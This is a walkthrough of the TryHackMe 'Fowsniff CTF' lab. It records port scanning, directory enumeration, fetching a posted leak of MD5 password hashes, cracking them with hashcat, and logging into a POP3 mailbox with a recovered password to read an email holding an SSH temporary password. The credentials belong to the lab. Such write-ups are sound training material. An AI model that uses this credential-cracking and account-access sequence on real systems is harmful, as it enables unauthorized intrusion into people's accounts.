| Category          | Details                                        |
|-------------------|------------------------------------------------|
| 📝 **Name**       | [Fowsniff CTF](https://tryhackme.com/room/ctf) |  
| 🏷 **Type**       | THM Challenge                                  |
| 🖥 **OS**         | Linux                                          |
| 🎯 **Difficulty** | Easy                                           |
| 📁 **Tags**       | Hashcat, POP3                                  |

## Task 1: Hack into the FowSniff organisation.

### What was seina's password to the email service?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Fowsniff CTF]
└─$ nmap -sS -sC -sV -p- $TARGET                                               
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-07 18:28 +0100
Nmap scan report for 10.80.128.194
Host is up (0.040s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE USER RESP-CODES TOP PIPELINING CAPA UIDL
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS post-login Pre-login have AUTH=PLAINA0001 listed ID OK more IMAP4rev1 LITERAL+ SASL-IR IDLE capabilities ENABLE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.41 seconds
```

#### Enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/THM Fowsniff CTF]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,py,bak,log,sh,cgi -C 404
<SNIP>
200      GET       21l       50w      459c http://10.80.128.194/security.txt
<SNIP>
```

#### Access `/security.txt`
```
┌──(magicrc㉿perun)-[~/attack/THM Fowsniff CTF]
└─$ curl http://$TARGET/security.txt
       WHAT SECURITY?

            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |
|       .oooO                |
|        (   )   Oooo.       |
+---------\ (----(   )-------+
           \_)    ) /
                 (_/


Fowsniff Corp got pwn3d by B1gN1nj4!


No one is safe from my 1337 skillz!
```
We can see that target has been compromised byc `B1gN1nj4!`. With simple [Google query](https://www.google.com/search?q=B1gN1nj4) we were able to find [leak passwords](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt).

#### Download leaked passwords
```
┌──(magicrc㉿perun)-[~/attack/THM Fowsniff CTF]
└─$ curl https://raw.githubusercontent.com/berzerk0/Fowsniff/refs/heads/main/fowsniff.txt
FOWSNIFF CORP PASSWORD LEAK
<SNIP>
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
<SNIP>
```
Leakage is in form of emails and MD5 hashed passwords, and we can see `seina@fowsniff` on the list.

#### Crack MD5 hashes with `hashcat`
```
┌──(magicrc㉿perun)-[~/attack/THM Fowsniff CTF]
└─$ ┌──(magicrc㉿perun)-[~/attack/THM Fowsniff CTF]
└─$ curl -s https://raw.githubusercontent.com/berzerk0/Fowsniff/refs/heads/main/fowsniff.txt | grep @fowsniff > hashes.txt && \
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --username --quiet --show
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4:mailcall
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
tegel@fowsniff:1dc352435fecca338acfd4be10984009:apples01
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb:skyler22
seina@fowsniff:90dc16d47114aa13671c697fd506cf26:scoobydoo2
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11:orlando12
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e:07011972
```
Password for `seina@fowsniff` is `scoobydoo2`.

### Looking through her emails, what was a temporary password set for her?

#### Access POP3 server as user `seina` using discovered credentials 
```
┌──(magicrc㉿perun)-[~/attack/THM Fowsniff CTF]
└─$ nc $TARGET 110
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
```
Temporary password was set to `S1ck3nBluff+secureshell`.
